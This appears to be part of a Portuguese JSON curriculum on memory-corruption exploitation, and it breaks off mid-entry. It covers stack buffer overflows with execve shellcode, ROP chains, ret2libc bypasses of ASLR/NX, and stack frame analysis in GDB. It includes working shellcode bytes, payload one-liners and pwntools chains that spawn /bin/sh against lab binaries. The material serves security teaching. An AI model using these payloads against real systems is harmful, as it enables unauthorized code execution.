                              "practicalExample": "Programa vuln.c: #include <stdio.h>; #include <string.h>; int main(int argc, char** argv){ char buf[64]; strcpy(buf, argv[1]); return 0; }. Compile: gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln. Shellcode exemplo (23 bytes): \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80. Payload: python3 -c 'print(\"A\"*76+\"\\x90\"*100+\"\\x31\\xc0...\"+\"\\xd0\\xd0\\xd0\\xd0\")' | ./vuln → spawna /bin/sh.",
                              "finalVerifications": [
                                "Exploit controla EIP e pula para NOP sled consistentemente.",
                                "Shellcode executa, spawna shell interativa (/bin/sh prompt).",
                                "GDB confirma jump para buffer address e execução de instruções shellcode.",
                                "Payload roda sem segfault em múltiplas tentativas.",
                                "Offset e endereço buffer validados em stack dump.",
                                "Shellcode standalone funciona fora do exploit."
                              ],
                              "assessmentCriteria": [
                                "Offset encontrado corretamente (erro <2 bytes).",
                                "Shellcode gerado sem null bytes e executável.",
                                "Payload inclui NOP sled efetivo (>50 bytes).",
                                "Return address aponta precisamente para buffer (±16 bytes).",
                                "Exploit spawna shell em <5 tentativas.",
                                "Relatório de depuração com screenshots gdb."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: gerenciamento de stack e strings.",
                                "Assembly x86: escrita e depuração de código de máquina.",
                                "Sistemas Operacionais: estrutura do stack e syscalls.",
                                "Redes: extensão para exploits remotos via sockets.",
                                "Ética em Cibersegurança: uso defensivo de vulnerabilidades."
                              ],
                              "realWorldApplication": "Demonstrar vulnerabilidades em pentests éticos (ex: OSCP), CTFs como PicoCTF/Pwnable, auditorias de software legado; mitigações como ASLR/Canary previnem ataques reais como Code Red worm ou EternalBlue."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.4.3.2",
                            "name": "Implementar Return-Oriented Programming (ROP) básico",
                            "description": "Identificar gadgets em binários ELF/PE via ROPgadget, chain para execve shell, contornando ASLR/DEP em cenários controlados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de teste e extrair gadgets ROP",
                                  "subSteps": [
                                    "Instale ROPgadget via pip: pip install ROPgadget",
                                    "Configure uma VM Linux 64-bit com ASLR e DEP desabilitados temporariamente (echo 0 > /proc/sys/kernel/randomize_va_space)",
                                    "Compile um binário ELF vulnerável simples com buffer overflow (ex: gcc -fno-stack-protector -z execstack -o vuln vuln.c)",
                                    "Execute ROPgadget --binary vuln para listar todos os gadgets disponíveis",
                                    "Filtre gadgets úteis como pop rdi; ret;, pop rsi; ret;, etc., salvando em um arquivo de referência"
                                  ],
                                  "verification": "Lista de gadgets gerada com pelo menos 10 gadgets úteis identificados e salvos",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Linux VM (Ubuntu)",
                                    "ROPgadget tool",
                                    "GCC compiler",
                                    "Binário vulnerável de exemplo"
                                  ],
                                  "tips": "Use --binary vuln --only \"pop|ret\" para filtrar gadgets específicos rapidamente",
                                  "learningObjective": "Configurar ambiente controlado e extrair gadgets ROP de binários ELF",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR inicialmente",
                                    "Usar binário 32-bit em ambiente 64-bit",
                                    "Não filtrar gadgets por arquitetura"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar binário e identificar gadgets para execve shell",
                                  "subSteps": [
                                    "Use objdump ou readelf para analisar seções do binário (ex: .text, libc se linkado)",
                                    "Identifique endereços de strings como \"/bin/sh\" usando strings vuln ou ROPgadget --string /bin/sh",
                                    "Encontre gadgets para syscalls: pop rdi/ret (arg1), pop rsi/ret (arg2), syscall/ret",
                                    "Liste endereços base da libc se necessário (ldd vuln)",
                                    "Documente 5-7 gadgets chave em uma tabela: gadget, opcode, uso pretendido"
                                  ],
                                  "verification": "Tabela com gadgets mapeados para argumentos de execve (rdi='/bin/sh', rsi=0, rdx=0)",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "objdump",
                                    "readelf",
                                    "strings tool",
                                    "pwntools para Python (opcional)"
                                  ],
                                  "tips": "Priorize gadgets de .text para estabilidade; evite gadgets com side-effects",
                                  "learningObjective": "Mapear gadgets ROP a parâmetros de syscall execve em binários ELF",
                                  "commonMistakes": [
                                    "Confundir registradores x86/x64",
                                    "Ignorar alinhamento de stack (8 bytes em x64)",
                                    "Não considerar NULL terminators em strings"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir chain ROP para chamar execve('/bin/sh', NULL, NULL)",
                                  "subSteps": [
                                    "Defina payload base: buffer overflow para controlar return address",
                                    "Construa chain: [padding] + [pop rdi; ret; + addr('/bin/sh')] + [pop rsi; ret; + 0] + [pop rdx; ret; + 0] + [syscall; ret;]",
                                    "Use Python com pwntools: from pwn import *; p = process('./vuln'); payload = b'A'*offset + chain; p.sendline(payload)",
                                    "Calcule offsets precisos com cyclic patterns (cyclic 200 | ./vuln)",
                                    "Teste chain em GDB com pwndbg: gef-pwndbg para visualizar stack e registradores"
                                  ],
                                  "verification": "Chain ROP montada em script Python que crasha corretamente no GDB",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Python 3",
                                    "pwntools (pip install pwntools)",
                                    "GDB com pwndbg/gef",
                                    "Binário vuln"
                                  ],
                                  "tips": "Use ROPgadget --chain para sugestões automáticas iniciais, mas customize manualmente",
                                  "learningObjective": "Montar sequências ROP precisas para bypass de DEP via gadgets existentes",
                                  "commonMistakes": [
                                    "Offset incorreto levando a ROP underflow",
                                    "Endianness errada em endereços",
                                    "Falta de padding para alinhamento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar exploit completo contornando ASLR/DEP em cenário controlado",
                                  "subSteps": [
                                    "Habilite ASLR parcial e use leak info-fake (ex: printf de got entry para leak libc base)",
                                    "Ajuste chain com leak: envie payload1 para leak, calcule base, envie payload2 com offsets",
                                    "Compile com -no-pie para PIE disabled inicialmente, depois habilite",
                                    "Execute exploit: python exploit.py && verifica shell interativa",
                                    "Debug com checksec para confirmar bypass: Checksec mostra NX/RELRO, mas ROP succeeds"
                                  ],
                                  "verification": "Shell (/bin/sh) aberta via ROP sem crash, comprovado por whoami ou id",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "pwntools",
                                    "GDB-Peda/Pwndbg",
                                    "checksec.sh",
                                    "Binário com PIE opcional"
                                  ],
                                  "tips": "Para ASLR, implemente info-leak primeiro; use one_gadget para chains mais simples",
                                  "learningObjective": "Executar ROP exploit funcional em ambiente com proteções parciais",
                                  "commonMistakes": [
                                    "Não limpar stack após syscall",
                                    "Leak incorreto devido a ASLR full",
                                    "DEP não bypassed por chain inválida"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, depurar e documentar o exploit ROP",
                                  "subSteps": [
                                    "Rode exploit 10x verificando consistência (sem ASLR full)",
                                    "Use GDB para step-through chain: ni em cada gadget",
                                    "Documente chain hex, endereços usados, lições aprendidas",
                                    "Adapte para PE (Windows) usando ROPgadget --binary vuln.exe",
                                    "Limpe ambiente: re-habilite ASLR/DEP"
                                  ],
                                  "verification": "Relatório com script funcional, screenshots de shell e análise de bypass",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "GDB",
                                    "Exploit script",
                                    "Notebook para documentação"
                                  ],
                                  "tips": "Registre todos os endereços com !pwndbg para reprodutibilidade",
                                  "learningObjective": "Depurar e documentar ROP chains para cenários reais controlados",
                                  "commonMistakes": [
                                    "Não testar múltiplas runs",
                                    "Omitir documentação de leaks",
                                    "Confundir ELF/PE gadgets"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF vulnerável a buffer overflow (vuln.c com gets()), extraia gadgets com ROPgadget, chain pop rdi; ret (0xdeadbeef para '/bin/sh'), pop rsi; ret (0), pop rdx; ret (0), syscall; ret. Payload Python: p.sendline(b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)). Resultado: shell spawn sem DEP crash.",
                              "finalVerifications": [
                                "Shell interativa (/bin/sh) obtida via ROP chain",
                                "Gadgets extraídos corretamente com ROPgadget (mínimo 5 úteis)",
                                "Chain executa sem crash em GDB (registradores corretos antes de syscall)",
                                "Bypass de DEP confirmado (no NX bit violado)",
                                "Exploit funciona em 80% das runs controladas",
                                "Documentação inclui endereços e offsets exatos"
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração e seleção de gadgets (100% match com ROPgadget)",
                                "Chain ROP válida sintaticamente e semanticamente para execve",
                                "Exploit roda autonomamente em ambiente controlado",
                                "Explicação clara de bypass ASLR/DEP via leaks ou fixed addresses",
                                "Código limpo, comentado e reprodutível",
                                "Análise de erros comuns evitados no processo"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: Leitura de opcodes e registradores",
                                "Análise de Binários: Uso de tools como objdump/readelf",
                                "Sistemas Operacionais: Syscalls Linux (execve #59)",
                                "Programação Python: Pwntools para crafting exploits",
                                "Criptografia/Proteções: Entender ASLR como randomização"
                              ],
                              "realWorldApplication": "Em pentests e CTFs (ex: pwn.college, HackTheBox), ROP demonstra bypass de mitigações como DEP/NX em binários legacy; pesquisadores usam para PoCs de CVEs reais, ensinando defesas como CFI/Control-Flow Integrity."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.3",
                              "10.1.4.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.4.4.3.3",
                            "name": "Testar injeção em ambientes com proteções (ASLR, NX)",
                            "description": "Simular injeção considerando mitigações, usando ret2libc ou ROP para bypass, com análise via gdb e strace.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste com Proteções ASLR e NX",
                                  "subSteps": [
                                    "Instale ferramentas necessárias: gcc, gdb, strace em uma VM Linux (ex: Ubuntu).",
                                    "Compile um binário vulnerável a buffer overflow com flags -fno-stack-protector -z execstack temporariamente para testar base, depois ative proteções.",
                                    "Ative ASLR globalmente com echo 2 > /proc/sys/kernel/randomize_va_space e verifique com cat /proc/sys/kernel/randomize_va_space.",
                                    "Verifique NX (DEP) com readelf -l binary | grep GNU_STACK e confirme permissão RW sem X.",
                                    "Use checksec.sh para validar proteções ativadas (ASLR, NX/DEP)."
                                  ],
                                  "verification": "Execute checksec no binário e confirme ASLR=Full, NX=Enabled sem crashes iniciais.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "VM Linux",
                                    "gcc",
                                    "gdb",
                                    "strace",
                                    "checksec.sh"
                                  ],
                                  "tips": "Use uma VM isolada para evitar riscos; desative ASLR temporariamente para debugging inicial com setarch -R.",
                                  "learningObjective": "Compreender configuração e verificação de mitigações modernas em binários.",
                                  "commonMistakes": [
                                    "Esquecer de recompilar com proteções",
                                    "Não isolar ambiente de teste",
                                    "Confundir ASLR com NX"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Binário Vulnerável e Mapear Layout de Memória",
                                  "subSteps": [
                                    "Execute gdb ./binary para análise estática: info proc mappings, disassemble main.",
                                    "Identifique offset do buffer overflow com cyclic pattern (gdb-peda ou pwntools cyclic).",
                                    "Use strace ./binary para rastrear chamadas de sistema e leaks iniciais.",
                                    "Localize funções úteis na libc com ldd ./binary e gdb info functions | grep system.",
                                    "Registre endereços base da libc e stack com ASLR ativo (múltiplas execuções para padrões)."
                                  ],
                                  "verification": "Anote offset exato (ex: 112 bytes) e endereços consistentes de system()/exit() via gdb.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "gdb",
                                    "strace",
                                    "pwntools (opcional)",
                                    "peda-gdb plugin"
                                  ],
                                  "tips": "Use gdb multi-execução para média de ASLR; foque em leaks parciais se full ASLR.",
                                  "learningObjective": "Dominar análise dinâmica de binários protegidos com gdb e strace.",
                                  "commonMistakes": [
                                    "Ignorar ASLR em análises",
                                    "Não usar cyclic para offset preciso",
                                    "Confundir heap com stack"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Payload Ret2Libc para Bypass NX",
                                  "subSteps": [
                                    "Construa chain: ret address -> system() address -> exit() address -> \"/bin/sh\" string address.",
                                    "Encontre \"/bin/sh\" em libc com gdb find &system,+999999,\"/bin/sh\".",
                                    "Crie payload: python3 -c 'print(\"A\"*offset + p64(pop_rdi) + p64(binsh) + p64(system) + p64(exit))' | ./binary.",
                                    "Ajuste endereços ASLR com leak parcial ou brute-force se parcial.",
                                    "Teste em gdb com run $(python3 -c '...') para validar chain."
                                  ],
                                  "verification": "Shell interativa spawna sem crash, confirmada com whoami ou id.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Python3",
                                    "pwntools para packing",
                                    "gdb"
                                  ],
                                  "tips": "Comece com ROP gadget finder (ROPgadget --binary binary); prefira pop rdi;ret para arg passing.",
                                  "learningObjective": "Construir chains ret2libc precisas bypassando NX sem shellcode executável.",
                                  "commonMistakes": [
                                    "Endereços errados por ASLR",
                                    "Ordem incorreta na chain (rdi antes system)",
                                    "Falta de exit() causando crash"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Injeção Completa e Analisar com Ferramentas de Debug",
                                  "subSteps": [
                                    "Injete payload via stdin ou args: echo -ne payload | ./binary.",
                                    "Monitore com strace -e trace=execve ./binary para confirmar execve(\"/bin/sh\").",
                                    "Debug falhas em gdb: set follow-fork-mode child; run payload.",
                                    "Evolua para ROP chain se ret2libc falha (use ROPgadget para gadgets).",
                                    "Documente bypass completo com screenshots de gdb e strace."
                                  ],
                                  "verification": "Execução bem-sucedida com shell, logs strace mostram /bin/sh spawn.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "strace",
                                    "gdb",
                                    "ROPgadget"
                                  ],
                                  "tips": "Grave sessão com script para reprodutibilidade; teste em ASLR full randomization.",
                                  "learningObjective": "Validar e debugar exploits em ambientes protegidos usando strace/gdb.",
                                  "commonMistakes": [
                                    "Não capturar output strace",
                                    "Debug sem follow-fork",
                                    "Payload muito longo causando truncamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie vuln.c: int main(int argc, char** argv) { char buf[100]; read(0, buf, 200); }. Compile: gcc vuln.c -o vuln -fno-stack-protector -no-pie. Ative proteções. Use gdb para achar offset 120. Leak libc base via puts@plt, calcule system=libc_base+offset. Payload: cyclic(120) + pop_rdi_ret + binsh_addr + system_addr + exit_addr. Injete: python3 -c payload | ./vuln → $ whoami.",
                              "finalVerifications": [
                                "Shell spawna consistentemente apesar de ASLR/NX.",
                                "strace confirma execve(/bin/sh) sem erros.",
                                "gdb mostra chain ROP/ret2libc executando corretamente.",
                                "checksec confirma proteções ativas pré e pós-exploit.",
                                "Nenhum leak de IP ou segfault prematuro.",
                                "Exploit funciona em 3/5 runs com ASLR full."
                              ],
                              "assessmentCriteria": [
                                "Explicação precisa de ASLR e NX impactos no exploit.",
                                "Offset e chain calculados corretamente sem erros.",
                                "Uso integrado de gdb/strace para análise.",
                                "Payload adaptado a randomização de memória.",
                                "Documentação clara de passos e endereços.",
                                "Evolução para ROP se ret2libc insuficiente."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender stack layout e chamadas.",
                                "Sistemas Operacionais: Mitigações de memória (ASLR, NX/DEP).",
                                "Redes: Adaptação para exploits remotos via sockets.",
                                "Análise Reversa: Uso de disassemblers e debuggers.",
                                "Criptografia: Leaks e partial ASLR bypass."
                              ],
                              "realWorldApplication": "Em pentesting ético (CTFs, bug bounties), analisa vulnerabilidades em serviços reais como web servers; ajuda desenvolvedores a fortalecer binários contra buffer overflows; essencial para red teaming e análise de malware que explora mitigações semelhantes."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.5",
                    "name": "Controle de Fluxo via Retorno",
                    "description": "Manipulação do ponteiro de retorno na pilha para execução de código arbitrário ou chaining de funções.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.5.1",
                        "name": "Estrutura da Pilha e Ponteiro de Retorno",
                        "description": "Compreensão da organização da pilha em chamadas de funções, incluindo o salvamento do ponteiro de instrução (EIP em 32 bits ou RIP em 64 bits) e como ele determina o fluxo de controle ao retornar.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.1.1",
                            "name": "Identificar componentes do frame de pilha",
                            "description": "Analisar o layout da pilha durante uma chamada de função, reconhecendo saved EBP, saved RET address e parâmetros, usando ferramentas como GDB para visualizar em assembly 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos básicos do frame de pilha em chamadas de função",
                                  "subSteps": [
                                    "Estude o funcionamento da pilha (stack) em arquiteturas x86 32/64 bits: crescimento para baixo, push/pop.",
                                    "Identifique componentes principais: parâmetros (da direita para esquerda), saved RET address, saved EBP (base pointer).",
                                    "Revise convenções de chamada: System V ABI para 64 bits (RDI, RSI, etc., mas foco em stack para mais args), stdcall/cdecl para 32 bits.",
                                    "Desenhe um diagrama manual da pilha antes/depois de uma chamada de função.",
                                    "Compare frames de pilha em 32 bits (EBP/RBP centrado) vs 64 bits (RBP opcional em alguns casos)."
                                  ],
                                  "verification": "Desenhe corretamente um diagrama da pilha para uma função com 3 parâmetros e explique verbalmente os componentes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação x86 ABI (System V)",
                                    "Diagramas de pilha online (ex: Felippe's blog)",
                                    "Papel e caneta para desenhos"
                                  ],
                                  "tips": "Lembre-se: RET address é pushado pelo CALL, EBP pelo PROLOG da função.",
                                  "learningObjective": "Explicar verbalmente a estrutura do frame de pilha e seus componentes principais em 32/64 bits.",
                                  "commonMistakes": [
                                    "Confundir ordem dos parâmetros (esquerda-direita vs direita-esquerda)",
                                    "Ignorar diferenças entre 32 e 64 bits",
                                    "Esquecer saved RET acima do saved EBP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar um programa C de exemplo para análise de pilha",
                                  "subSteps": [
                                    "Escreva um programa C simples com função main chamando uma função 'foo' com 3 parâmetros (int, char*, int).",
                                    "Compile para 32 bits: gcc -m32 -g -o prog32 exemplo.c; para 64 bits: gcc -g -o prog64 exemplo.c.",
                                    "Adicione printf na função para marcar execução e breakpoints potenciais.",
                                    "Verifique o binário com objdump -d para inspecionar assembly básico.",
                                    "Teste execução normal para confirmar funcionamento."
                                  ],
                                  "verification": "Compile com sucesso ambos os binários e execute sem erros, confirmando saída esperada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "Editor de texto (VSCode/vim)",
                                    "Terminal Linux/macOS com multilib para -m32"
                                  ],
                                  "tips": "Use -fno-stack-protector -z execstack para simplificar (mas note impactos em segurança).",
                                  "learningObjective": "Criar um binário debugável que demonstre uma chamada de função com parâmetros na pilha.",
                                  "commonMistakes": [
                                    "Esquecer flag -g para debug info",
                                    "Problemas de linking em 32 bits sem lib32",
                                    "Parâmetros que cabem em registradores em 64 bits (use >6 args)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e navegar no GDB para visualizar a pilha",
                                  "subSteps": [
                                    "Inicie GDB: gdb ./prog64 (ou prog32).",
                                    "Defina breakpoint na entrada de foo: break foo.",
                                    "Execute: run, então info registers para ver ESP/RSP, EBP/RBP.",
                                    "Use x/20x $rsp (ou $esp) para dump hex da pilha.",
                                    "Navegue: stepi para instruções assembly, info frame para frame atual."
                                  ],
                                  "verification": "Visualize dump da pilha mostrando valores pushados e identifique aproximadamente RET address por alinhamento.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB instalado",
                                    "Binários compilados do step 2"
                                  ],
                                  "tips": "Use 'x/10gx $rsp' para 64 bits (quad words), 'x/20wx $esp' para 32 bits.",
                                  "learningObjective": "Usar comandos GDB básicos para inspecionar registradores e memória da pilha.",
                                  "commonMistakes": [
                                    "Confundir $rsp vs $rbp",
                                    "Dump insuficiente (use mais words)",
                                    "Executar sem breakpoint e perder o momento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar e rotular componentes específicos do frame de pilha",
                                  "subSteps": [
                                    "No breakpoint em foo, compare dump da pilha com valores conhecidos: parâmetros pushados por main.",
                                    "Identifique saved RET: logo acima de saved EBP, valor é endereço de CALL+5.",
                                    "Localize saved EBP/RBP: push %rbp no prolog, valor é antigo RBP.",
                                    "Marque parâmetros: abaixo de saved EBP, na ordem esperada.",
                                    "Repita para 32 bits e note diferenças (mais uso de stack em 32 bits).",
                                    "Use 'disassemble foo' para correlacionar com assembly."
                                  ],
                                  "verification": "Anote offsets exatos e valores para saved EBP, RET, params, confirmando com continuação e observação de RET.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB session ativa",
                                    "Diagrama manual do step 1"
                                  ],
                                  "tips": "Calcule offsets: RET em $rsp+8 (64 bits), params em posições fixas relativas.",
                                  "learningObjective": "Reconhecer e nomear saved EBP, RET address e parâmetros no dump da pilha via GDB.",
                                  "commonMistakes": [
                                    "Misinterpretar valores aleatórios como componentes",
                                    "Ignorar alinhamento 8/16 bytes",
                                    "Confundir com variáveis locais"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile e rode no GDB: int foo(int a, char* b, int c) { printf(\"%d %s %d\",a,b,c); }. Chame de main(foo(42,\"test\",99)). No breakpoint, x/10gx $rsp mostra: params em $rsp+0x10/0x18/0x20, RET em $rsp+0x8, saved RBP em $rsp+0x0 após prolog.",
                              "finalVerifications": [
                                "Desenhar frame de pilha preciso para exemplo dado.",
                                "Identificar saved RET, EBP e 3 params em dump GDB 32/64 bits.",
                                "Explicar como CALL pusha RET address.",
                                "Diferenciar stack frames em 32 vs 64 bits.",
                                "Usar GDB para navegar e dump pilha sem erros.",
                                "Correlacionar valores da pilha com código fonte."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de componentes (100% correto em dumps).",
                                "Uso correto de GDB comandos (info frame, x/$rsp).",
                                "Compreensão de ABIs (ordem params, registradores).",
                                "Análise comparativa 32/64 bits.",
                                "Diagrama claro e rotulado.",
                                "Explicação verbal fluida sem hesitação."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: convenções de chamada.",
                                "Sistemas Operacionais: gerenciamento de memória e stack.",
                                "Segurança Computacional: base para buffer overflows/ROP.",
                                "Engenharia Reversa: análise binária com disassemblers.",
                                "Debugging: ferramentas como GDB/WinDbg."
                              ],
                              "realWorldApplication": "Em análise de vulnerabilidades, identificar RET address na pilha permite crafts de ROP chains para bypass ASLR/DEP; debugging crashes em produção via core dumps; reverse engineering malwares para entender call flows."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.2",
                            "name": "Simular fluxo de retorno em assembly",
                            "description": "Executar e depurar código assembly simples para observar como o RET instrui carrega o endereço salvo na pilha para EIP/RIP, alterando o controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e escrever um programa assembly simples com CALL e RET",
                                  "subSteps": [
                                    "Instale NASM (netwide assembler) e GDB (GNU Debugger) no seu sistema Linux via apt: sudo apt install nasm gdb.",
                                    "Crie um novo arquivo chamado 'return_flow.asm' usando um editor de texto como vim ou nano.",
                                    "Escreva o código assembly básico para x86-64: inclua seções .data para mensagens, .text com global _start, função main que usa CALL para subrotina 'subroutine', que imprime uma mensagem simples e executa RET.",
                                    "Exemplo de código: section .data msg db 'Hello from main!',10,0; section .text global _start; _start: call subroutine; mov rax,60; mov rdi,0; syscall; subroutine: mov rax,1; mov rdi,1; mov rsi,msg; mov rdx,15; syscall; ret;",
                                    "Adicione comentários explicando o CALL (empurra RIP na pilha) e RET (pop para RIP)."
                                  ],
                                  "verification": "Salve o arquivo e execute 'nasm -f elf64 return_flow.asm -o return_flow.o' sem erros de sintaxe.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM",
                                    "GDB",
                                    "Editor de texto (vim/nano)",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use registradores corretos para syscalls em x86-64 (rax para syscall number). Teste sintaxe com nasm -f elf64 antes de linkar.",
                                  "learningObjective": "Dominar a escrita de código assembly básico com sub-rotinas usando CALL e RET para entender push/pop implícito na pilha.",
                                  "commonMistakes": [
                                    "Usar sintaxe x86 em vez de x86-64 (ex: int 80h ao invés de syscall)",
                                    "Esquecer de definir global _start",
                                    "Não incluir seção .data para strings"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar, linkar e executar o programa para observar execução normal",
                                  "subSteps": [
                                    "Linke o objeto: ld return_flow.o -o return_flow.",
                                    "Execute o binário: ./return_flow e observe a saída 'Hello from main!' (subrotina imprime antes de RET).",
                                    "Verifique o status de saída: echo $? (deve ser 0).",
                                    "Examine o binário com objdump: objdump -d return_flow | grep -A5 -B5 'call\\|ret' para ver instruções CALL e RET.",
                                    "Anote os endereços de memória das instruções CALL e RET."
                                  ],
                                  "verification": "Programa executa sem crash e imprime mensagem corretamente, com RET retornando ao fluxo principal.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "ld linker",
                                    "objdump",
                                    "Terminal"
                                  ],
                                  "tips": "Use 'strace ./return_flow' para ver syscalls e confirmar que RET não causa erro.",
                                  "learningObjective": "Verificar que CALL/RET funcionam corretamente em execução normal, preparando para depuração.",
                                  "commonMistakes": [
                                    "Linkar com formato errado (use -f elf64)",
                                    "Executar sem permissões (+x)",
                                    "Ignorar warnings de linker"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Depurar com GDB para observar pilha e fluxo de RET",
                                  "subSteps": [
                                    "Inicie GDB: gdb ./return_flow.",
                                    "Defina breakpoint na instrução CALL: break *main+offset (use 'disass main' para achar).",
                                    "Execute: run, então continue até CALL, examine pilha: x/10gx $rsp (veja endereço de retorno empurrado).",
                                    "Continue até RET na subrotina: stepi até ret, examine x/1gx $rsp (topo da pilha é endereço pós-CALL), então 'ni' para executar RET e ver RIP mudado.",
                                    "Use 'info registers rip' antes/depois RET para confirmar carga do endereço da pilha para RIP."
                                  ],
                                  "verification": "No GDB, confirme que RET popa o endereço correto da pilha para RIP, alterando fluxo de volta ao chamador.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB debugger"
                                  ],
                                  "tips": "Use 'tui disas' para interface visual. 'x/s $rsp' para strings na pilha.",
                                  "learningObjective": "Visualizar dinamicamente como RET carrega EIP/RIP da pilha, demonstrando controle de fluxo.",
                                  "commonMistakes": [
                                    "Breakpoint errado (use disas para offsets)",
                                    "Examinar pilha errada ($rsp vs $esp)",
                                    "Não stepi instrução por instrução"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular manipulação do ponteiro de retorno para alterar fluxo",
                                  "subSteps": [
                                    "Modifique o código para simular overflow: adicione buffer na subrotina, preencha com dados para sobrescrever ponteiro de retorno.",
                                    "Exemplo: adicione push de dados extras antes RET para overflow simulado apontando para novo endereço.",
                                    "Recompile e depure novamente: observe RSP sobrescrito, RET pulando para endereço desejado (ex: loop infinito ou nova função).",
                                    "Crie uma 'fake_ret' label com instruções diferentes e force RET para lá.",
                                    "Compare fluxos normal vs manipulado com telas do GDB."
                                  ],
                                  "verification": "RET carrega endereço manipulado, alterando fluxo para código não intencional sem crash imediato.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GDB",
                                    "NASM",
                                    "Editor"
                                  ],
                                  "tips": "Use 'set {char[8]}$rsp = 0x地址_falso' no GDB para teste sem recompilar.",
                                  "learningObjective": "Demonstrar vulnerabilidade de controle de fluxo via pilha, base para exploits.",
                                  "commonMistakes": [
                                    "Endereços absolutos errados (use relativos)",
                                    "Não alinhar stack (add rsp,8 após push)",
                                    "Ignorar ASLR (desative com set disable-randomization on no GDB)"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie 'vuln.asm' com buffer de 8 bytes na subrotina: sub rsp,16; mov [rsp],0xdeadbeefdeadbeef (endereço fake); ret. Compile, depure: CALL empurra ret_addr, buffer overflow sobrescreve para 0xdeadbeef, RET pula para lá causando crash controlado. Capture com 'info reg rip' e 'x/gx $rsp'.",
                              "finalVerifications": [
                                "Explicar em palavras próprias como RET popa [RSP] para RIP.",
                                "Screenshot do GDB mostrando pilha com ret_addr antes/depois RET.",
                                "Demonstrar manipulação de RSP no GDB alterando fluxo.",
                                "Identificar endereço de retorno correto via objdump.",
                                "Executar programa modificado pulando para label customizada.",
                                "Descrever impacto em segurança (controle de fluxo hijack)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na observação de RSP/RIP durante CALL/RET (100% match com esperado).",
                                "Número de substeps completados sem erros de compilação/depuração.",
                                "Capacidade de simular overflow e explicar alteração de fluxo.",
                                "Uso correto de comandos GDB (break, x/, info reg).",
                                "Identificação de pelo menos 3 diferenças entre fluxo normal e manipulado.",
                                "Relato escrito conectando simulação a buffer overflow real."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores de controle (RIP) e stack management.",
